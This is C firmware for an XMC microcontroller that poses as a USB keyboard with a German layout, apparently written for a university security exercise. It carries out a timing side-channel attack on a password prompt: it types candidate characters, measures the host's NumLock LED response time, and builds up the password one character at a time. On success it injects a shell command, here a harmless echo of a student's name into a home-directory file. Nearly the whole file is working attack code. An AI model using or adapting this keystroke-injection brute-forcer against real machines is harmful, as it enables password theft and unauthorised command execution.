#include "KeyboardHID.h"
#include "german_keyboardCodes.h"
#include <ctype.h>
#include <stdint.h>

/* Macros: */
#define LED1 P1_1
#define LED2 P1_0
#define PASSWORD_MAX_LENGTH 20
#define GERMAN_KEYBOARD_SC_CAPS_LOCK                          0x39

/* Clock configuration */
XMC_SCU_CLOCK_CONFIG_t clock_config = {
    .syspll_config.p_div = 2,
    .syspll_config.n_div = 80,
    .syspll_config.k_div = 4,
    .syspll_config.mode = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
    .syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
    .enable_oschp = true,
    .calibration_mode = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
    .fsys_clksrc = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
    .fsys_clkdiv = 1,
    .fcpu_clkdiv = 1,
    .fccu_clkdiv = 1,
    .fperipheral_clkdiv = 1};

/* Forward declaration of HID callbacks as defined by LUFA */
bool CALLBACK_HID_Device_CreateHIDReport(
    USB_ClassInfo_HID_Device_t *const HIDInterfaceInfo,
    uint8_t *const ReportID,
    const uint8_t ReportType,
    void *ReportData,
    uint16_t *const ReportSize);

void CALLBACK_HID_Device_ProcessHIDReport(
    USB_ClassInfo_HID_Device_t *const HIDInterfaceInfo,
    const uint8_t ReportID,
    const uint8_t ReportType,
    const void *ReportData,
    const uint16_t ReportSize);

void SystemCoreClockSetup(void);

// Global variables
uint32_t start_time_meas = 0;
uint32_t end_time_meas = 0;
uint32_t elapsed_time = 0;
uint8_t test_index = 0;
uint8_t guessed = 0;
char best_char = 0;
uint8_t password_tail = 0;
uint32_t best_time = 0;
char password[PASSWORD_MAX_LENGTH + 1] = {0};
uint8_t password_index = 0;
const char pwchars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!()-_+=~;:,.<>[]{}/?&$";
uint8_t characterSent = 0;
const char hack[] = "#^echo \"Johannes Hirschbeck\" > $HOME/03810073^";
//const char hack[] = "#ECHO 2mARKO rEICHHART2 < 4home7=§(!\"!()^";
uint8_t indexToSend = 0;
uint8_t characterSent2 = 0;
uint8_t password_correct_flag = 0;
uint8_t init_run_flag = 0;
int i = 0;

// Simple tick counter for timing
volatile uint32_t tick_counter = 0;

uint8_t translate_char(const char c)
{
    switch (c)
    {
    
    case '^':
        return GERMAN_KEYBOARD_SC_ENTER;
    case '#':  
        return GERMAN_KEYBOARD_SC_CAPS_LOCK;
    case 'a':
        return GERMAN_KEYBOARD_SC_A;
    case 'b':
        return GERMAN_KEYBOARD_SC_B;
    case 'c':
        return GERMAN_KEYBOARD_SC_C;
    case 'd':
        return GERMAN_KEYBOARD_SC_D;
    case 'e':
        return GERMAN_KEYBOARD_SC_E;
    case 'f':
        return GERMAN_KEYBOARD_SC_F;
    case 'g':
        return GERMAN_KEYBOARD_SC_G;
    case 'h':
        return GERMAN_KEYBOARD_SC_H;
    case 'i':
        return GERMAN_KEYBOARD_SC_I;
    case 'j':
        return GERMAN_KEYBOARD_SC_J;
    case 'k':
        return GERMAN_KEYBOARD_SC_K;
    case 'l':
        return GERMAN_KEYBOARD_SC_L;
    case 'm':
        return GERMAN_KEYBOARD_SC_M;
    case 'n':
        return GERMAN_KEYBOARD_SC_N;
    case 'o':
        return GERMAN_KEYBOARD_SC_O;
    case 'p':
        return GERMAN_KEYBOARD_SC_P;
    case 'q':
        return GERMAN_KEYBOARD_SC_Q;
    case 'r':
        return GERMAN_KEYBOARD_SC_R;
    case 's':
        return GERMAN_KEYBOARD_SC_S;
    case 't':
        return GERMAN_KEYBOARD_SC_T;
    case 'u':
        return GERMAN_KEYBOARD_SC_U;
    case 'v':
        return GERMAN_KEYBOARD_SC_V;
    case 'w':
        return GERMAN_KEYBOARD_SC_W;
    case 'x':
        return GERMAN_KEYBOARD_SC_X;
    case 'y':
        return GERMAN_KEYBOARD_SC_Y;
    case 'z':
        return GERMAN_KEYBOARD_SC_Z;

    case 'A':
        return GERMAN_KEYBOARD_SC_A;
    case 'B':
        return GERMAN_KEYBOARD_SC_B;
    case 'C':
        return GERMAN_KEYBOARD_SC_C;
    case 'D':
        return GERMAN_KEYBOARD_SC_D;
    case 'E':
        return GERMAN_KEYBOARD_SC_E;
    case 'F':
        return GERMAN_KEYBOARD_SC_F;
    case 'G':
        return GERMAN_KEYBOARD_SC_G;
    case 'H':
        return GERMAN_KEYBOARD_SC_H;
    case 'I':
        return GERMAN_KEYBOARD_SC_I;
    case 'J':
        return GERMAN_KEYBOARD_SC_J;
    case 'K':
        return GERMAN_KEYBOARD_SC_K;
    case 'L':
        return GERMAN_KEYBOARD_SC_L;
    case 'M':
        return GERMAN_KEYBOARD_SC_M;
    case 'N':
        return GERMAN_KEYBOARD_SC_N;
    case 'O':
        return GERMAN_KEYBOARD_SC_O;
    case 'P':
        return GERMAN_KEYBOARD_SC_P;
    case 'Q':
        return GERMAN_KEYBOARD_SC_Q;
    case 'R':
        return GERMAN_KEYBOARD_SC_R;
    case 'S':
        return GERMAN_KEYBOARD_SC_S;
    case 'T':
        return GERMAN_KEYBOARD_SC_T;
    case 'U':
        return GERMAN_KEYBOARD_SC_U;
    case 'V':
        return GERMAN_KEYBOARD_SC_V;
    case 'W':
        return GERMAN_KEYBOARD_SC_W;
    case 'X':
        return GERMAN_KEYBOARD_SC_X;
    case 'Y':
        return GERMAN_KEYBOARD_SC_Y;
    case 'Z':
        return GERMAN_KEYBOARD_SC_Z;

    case ' ':
        return GERMAN_KEYBOARD_SC_SPACE;
    case '1':
        return GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION;
    case '2':
        return GERMAN_KEYBOARD_SC_2_AND_QUOTES;
    case '3':
        return GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH;
    case '4':
        return GERMAN_KEYBOARD_SC_4_AND_DOLLAR;
    case '5':
        return GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE;
    case '6':
        return GERMAN_KEYBOARD_SC_6_AND_AMPERSAND;
    case '7':
        return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
    case '8':
        return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
    case '9':
        return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;
    case '0':
        return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;

    case '!':
        return GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION;
    case '"':
        return GERMAN_KEYBOARD_SC_2_AND_QUOTES;
    case '$':
        return GERMAN_KEYBOARD_SC_4_AND_DOLLAR;
    case'§':
        return GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH;
    case '%':
        return GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE;
    case '&':
        return GERMAN_KEYBOARD_SC_6_AND_AMPERSAND;
    case '/':
        return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
    case '(':
        return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
    case ')':
        return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;
    case '=':
        return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;
    case '?':
        return GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH;
    case '-':
        return GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE;
    case '_':
        return GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE;
    case '+':
        return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;
    case '*':
        return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;
    case '~':
        return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;
    case ';':
        return GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON;
    case ':':
        return GERMAN_KEYBOARD_SC_DOT_AND_COLON;
    case ',':
        return GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON;
    case '.':
        return GERMAN_KEYBOARD_SC_DOT_AND_COLON;
    case '<':
        return GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE;
    case '>':
        return GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE;
    case '[':
        return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
    case ']':
        return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;
    case '{':
        return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
    case '}':
        return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;

    default:
        return 0; // Zeichen nicht unterstützt
    }
}

bool requires_shift(char c)
{
    return isupper(c) || strchr("!\"$&/()=?;:_>§", c);
}

bool requires_alt_gr(char c)
{
    return strchr("[]{}\\~|", c);
}

/**
 * Main program entry point. This routine configures the hardware required by
 * the application, then enters a loop to run the application tasks in sequence.
 */
int main(void)
{
    // Init LED pins for debugging and NUM/CAPS visual report
    XMC_GPIO_SetMode(LED1, XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
    XMC_GPIO_SetMode(LED2, XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
    
    // Initialize SysTick for timing measurements
    SystemCoreClockSetup();
    SysTick_Config(SystemCoreClock / 1000000);
    
    USB_Init();

    // Wait until host has enumerated HID device
    for (int i = 0; i < 10e6; ++i)
        ;

    while (1)
    {
        HID_Device_USBTask(&Keyboard_HID_Interface);
    }
}

// Callback function called when a new HID report needs to be created
bool CALLBACK_HID_Device_CreateHIDReport(
    USB_ClassInfo_HID_Device_t *const HIDInterfaceInfo,
    uint8_t *const ReportID,
    const uint8_t ReportType,
    void *ReportData,
    uint16_t *const ReportSize)
{
    USB_KeyboardReport_Data_t *report = (USB_KeyboardReport_Data_t *)ReportData;
    *ReportSize = sizeof(USB_KeyboardReport_Data_t);
    

    if (!password_correct_flag)
    {
        // Send the character
        if (characterSent)
        {
            //key release
            report->Modifier = 0;
            report->Reserved = 0;
            report->KeyCode[0] = 0;
            characterSent = 0;
        }
        else
        {
            // First, send all known password characters
            if (password_index < password_tail) {
                report->Modifier = requires_shift(password[password_index]) ? HID_KEYBOARD_MODIFIER_LEFTSHIFT : 0;
                report->Modifier = requires_alt_gr(password[password_index]) ? HID_KEYBOARD_MODIFIER_RIGHTALT : report->Modifier;
                report->Reserved = 0;
                report->KeyCode[0] = translate_char(password[password_index]);
                password_index++;
            }
            // Then send the current test character
            else if (!guessed && test_index < strlen(pwchars))
            {
                report->Modifier = requires_shift(pwchars[test_index]) ? HID_KEYBOARD_MODIFIER_LEFTSHIFT : 0;
                report->Modifier = requires_alt_gr(pwchars[test_index]) ? HID_KEYBOARD_MODIFIER_RIGHTALT : report->Modifier;
                report->Reserved = 0;
                report->KeyCode[0] = translate_char(pwchars[test_index]);
                
                guessed = 1;
            }
            // Finally, send enter to test the password
            else{
                // pc wait loop
                 //for (uint32_t i = 0; i < 1000000; ++i)
                   //  ;
                
                report->Modifier = 0; 
			    report->Reserved = 0; 
                report->KeyCode[0] = GERMAN_KEYBOARD_SC_ENTER;
                guessed = 0;
                password_index = 0;
                if (test_index < strlen(pwchars)) {
                    test_index++;
                }
                else{
                    test_index = 0;
                    password[password_tail] = best_char;
                    password_tail++;
                    best_time = 0;
                }
                start_time_meas = tick_counter;
            }
            characterSent = 1;
        }

    }
    else //send hack file
    {
        if(i < strlen(hack)) 
        {
		if(characterSent2) {
			report->Modifier = 0; 
			report->Reserved = 0; 
			report->KeyCode[0] = 0; 
			characterSent2 = 0;
		} 
        else {
            
			report->Modifier = requires_shift(hack[i]) ? HID_KEYBOARD_MODIFIER_LEFTSHIFT : 0;
            report->Reserved = 0;
            report->KeyCode[0] = translate_char(hack[i]); 
			characterSent2 = 1;
            i++;
		    }
	    }
    }
    return true;
}

// Called on report input. For keyboard HID devices, that's the state of the LEDs
void CALLBACK_HID_Device_ProcessHIDReport(
    USB_ClassInfo_HID_Device_t *const HIDInterfaceInfo,
    const uint8_t ReportID,
    const uint8_t ReportType,
    const void *ReportData,
    const uint16_t ReportSize)
{
    uint8_t *report = (uint8_t *)ReportData;

    if (*report & HID_KEYBOARD_LED_NUMLOCK)
    {
        //XMC_GPIO_SetOutputHigh(LED1);
        //if (characterSent)
        //{
            end_time_meas = tick_counter;
            
            // Handle potential overflow of tick_counter
            if (end_time_meas >= start_time_meas)
            {
                // Normal case: no overflow occurred
                elapsed_time = end_time_meas - start_time_meas;
            }
            else
            {
                // Overflow case: tick_counter wrapped around
                elapsed_time = (UINT32_MAX - start_time_meas) + end_time_meas + 1;
            }
            
            if (elapsed_time > best_time)
            {
                //XMC_GPIO_SetOutputHigh(LED1);
                best_time = elapsed_time;
                best_char = pwchars[test_index - 1];
            }
        //}
 
    }
    else
    {
        //start_time_meas = tick_counter;
        //XMC_GPIO_SetOutputLow(LED1);
    }

    if (*report & HID_KEYBOARD_LED_CAPSLOCK)
    {
        XMC_GPIO_SetOutputHigh(LED2);
        password_correct_flag = 1;
    }
    else
    {
        XMC_GPIO_SetOutputLow(LED2);
    }
}

void SystemCoreClockSetup(void)
{
    /* Setup settings for USB clock */
    XMC_SCU_CLOCK_Init(&clock_config);

    XMC_SCU_CLOCK_EnableUsbPll();
    XMC_SCU_CLOCK_StartUsbPll(2, 64);
    XMC_SCU_CLOCK_SetUsbClockDivider(4);
    XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
    XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

    SystemCoreClockUpdate();
}

// SysTick interrupt handler for timing
void SysTick_Handler(void)
{
    tick_counter++;
}

